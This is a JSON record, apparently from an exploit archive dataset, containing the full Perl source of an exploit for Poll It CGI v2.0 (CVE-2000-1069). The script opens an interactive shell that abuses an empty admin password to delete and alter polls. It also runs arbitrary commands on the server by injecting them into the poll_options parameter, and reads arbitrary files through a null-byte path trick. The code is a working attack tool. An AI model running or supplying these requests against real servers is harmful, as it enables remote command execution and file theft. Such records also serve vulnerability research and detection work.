{
  "id": "177",
  "title": "Poll It CGI 2.0 - Multiple Vulnerabilities",
  "cve": "CVE-2000-1069",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n######################################\r\n#                                    #\r\n#                                    #\r\n#      Poll It CGI v2.0 exploit      #\r\n#       keelis/havoc korp 2000       #\r\n#                                    #\r\n#    shouts to modjo, p, zen, kd,    #\r\n#     ab, all the script kiddies.    #\r\n#                                    #\r\n#                                    #\r\n#     keelis(at)hushmail(dot)com     #\r\n#                                    #\r\n#                                    #\r\n######################################\r\n\r\nuse Socket;\r\n\r\n($host, $cgi_loc) = @ARGV[0,1];\r\n\r\n$ip=inet_aton($host);\r\n\r\nprint(\"\\n\\t+---   Poll It CGI v2.0 exploit  ---+\");\r\nprint(\"\\n\\t+---    keelis/havoc korp 2000   ---+\\n\\n\\n\");\r\n\r\nusage() if (!defined($host) || !defined($cgi_loc));\r\n\r\nwhile(true)\r\n{\r\n\tprint \"[poll\\@$host] \";\r\n\r\n\t$stdin = \\*STDIN;\r\n\t$cmdin = <$stdin>;\r\n\r\n\tchomp($cmdin);\r\n\t($cmd, $param) = split(/ /, $cmdin, 2);\r\n\t\r\n\tif ($cmd eq \"d\")\r\n\t{\r\n\t\t$request = \"?load=admin&admin_password=&action=delete_poll\";\r\n\t\t$success_msg = \"current poll has been deleted\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"e\")\r\n\t{\r\n\t\t$request = \"?load=admin&admin_password=&action=expire_poll\";\r\n\t\t$success_msg = \"current poll has been expired\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"c\")\r\n\t{\r\n\t\tif (!defined($param))\r\n\t\t{\r\n\t\t\tprint \"you need to specify a voting topic for the new poll\\n\\n\";\r\n\t\t\tnext;\r\n\t\t}\r\n\r\n\t\t$request = \"?load=admin&admin_password=&action=create_new&new_pollaction=1&show_after=1&new_title=$param\";\r\n\t\t$success_msg = \"created new poll with voting topic: \\\"$param\\\"\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"a\")\r\n\t{\r\n\t\tif (!defined($param))\r\n\t\t{\r\n\t\t\tprint \"you need to specify the text for the new voting option\\n\\n\";\r\n\t\t\tnext;\r\n\t\t}\r\n\r\n\t\t$request = \"?load=admin&admin_password=&action=add_option&add_option=$param\";\r\n\t\t$success_msg = \"voting option added to current poll: \\\"$param\\\"\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"g\")\r\n\t{\r\n\t\tif (!defined($param))\r\n\t\t{\r\n\t\t\tprint \"you need to specify the command to be run\\n\\n\";\r\n\t\t\tnext;\r\n\t\t}\r\n\r\n\t\t$request = \"?load=admin&admin_password=&action=add_option&add_option=none&poll_options=$param%7C\";\r\n\t\t$success_msg = \"command has been run on remote server: \\\"$param\\\"\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"r\")\r\n\t{\r\n\t\tif (!defined($param))\r\n\t\t{\r\n\t\t\tprint \"you need to specify the file to be read\\n\\n\";\r\n\t\t\tnext;\r\n\t\t}\r\n\r\n\t\t$request = \"?load=admin&data_dir=$param%00\";\r\n\t\t$success_msg = \"contents of \\\"$param\\\" follow:\\n\\n\";\r\n\t\tmake_request();\r\n\t}\r\n\r\n\tif ($cmd eq \"?\" || $cmd eq \"h\" || $cmd eq \"help\")\r\n\t{\r\n\t\tprint \"\\n? \\t\\tshow this help screen\\n\";\r\n\t\tprint \"d \\t\\tdelete current poll\\n\";\r\n\t\tprint \"e \\t\\texpire current poll\\n\";\r\n\t\tprint \"c <param>\\tcreate new poll using <param> as topic\\n\";\r\n\t\tprint \"a <param>\\tadd <param> to voting options\\n\";\r\n\t\tprint \"r <param>\\tread the file <param> in remote server\\n\";\r\n\t\tprint \"g <param>\\trun <param> in the remote server\\n\";\r\n\t\tprint \"x \\t\\texit pollex.pl shell\\n\\n\";\r\n\t\tnext;\r\n\t}\r\n\r\n\tif ($cmd eq \"x\")\r\n\t{\r\n\t\tprint \"\\n\";\r\n\t\tlast;\r\n\t}\r\n\r\n\tprint \"command not found. use \\\"?\\\" for help screen.\\n\\n\";\r\n}\r\n\r\nsub make_request {\r\n\t$request=~s/ /+/g;\r\n\t$request=~s/\\\\/%5C/g;\r\n\t$request=~s/\\//%2F/g;\r\n\r\n\tmy @req=sendraw(\"GET $cgi_loc$request HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\");\r\n\t$reqanswer=join('', @req);\r\n\r\n\t($httpv, $httpcode) = split(/ /, $reqanswer);\r\n\t$httpcode = substr($httpcode, 0, 3);\r\n\r\n\tif ($httpcode eq \"200\") {\r\n\t\tprint $success_msg if ($cmd ne \"r\");\r\n\t} else {\r\n\t\tif ($httpcode ne \"404\")\r\n\t\t{\r\n\t\t\tprint \"httpd returned an error code:\\n\\n\";\r\n\t\t\tprint $reqanswer,\"\\n\";\r\n\t\t} else {\r\n\t\t\tdie \"unexpected httpd error code 404. aborting...\\n\\n\"\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tif ($cmd eq \"r\")\r\n\t{\t$reqanswer=substr($reqanswer, index($reqanswer, \"\\r\\n\\r\\n\")+4);\r\n\r\n\t\tif (substr($reqanswer, 6, 15) eq \"Template : File\")\r\n\t\t{\r\n\t\t\tprint \"file \\\"$param\\\" not found or non-readable from cgi\\n\\n\";\r\n\t\t} else {\r\n\t\t\tprint $success_msg;\r\n\t\t\tprint $reqanswer,\"\\n\";\r\n\t\t}\r\n\t}\r\n\r\n\tnext;\r\n}\r\n\r\nsub usage {\r\n\tprint \"Usage:  pollex.pl <host> <cgi_loc>\\n\\n\";\r\n\tprint \"\\thost   :\\thost/ip where CGI resides\\n\";\r\n\tprint \"\\tcgi_loc:\\tpath to the CGI (non-SSI version needed)\\n\\n\";\r\n\texit(0);\r\n}\r\n\r\nsub sendraw {\r\n        my ($pstr)=@_;\r\n\r\n        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||\r\n                die(\"socket problems... aborting.\\n\");\r\n\r\n        if(connect(S,pack \"SnA4x8\",2,80,$ip)){\r\n                select(S);\r\n                $|=1;\r\n                print $pstr;\r\n                my @in=<S>; \r\n                select(STDOUT);\r\n\t        close(S); \r\n                return @in;\r\n        } else {\r\n\t\tdie(\"can\\'t connect... aborting.\\n\");\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2000-11-15]",
  "url": "https://www.exploit-db.com/exploits/177"
}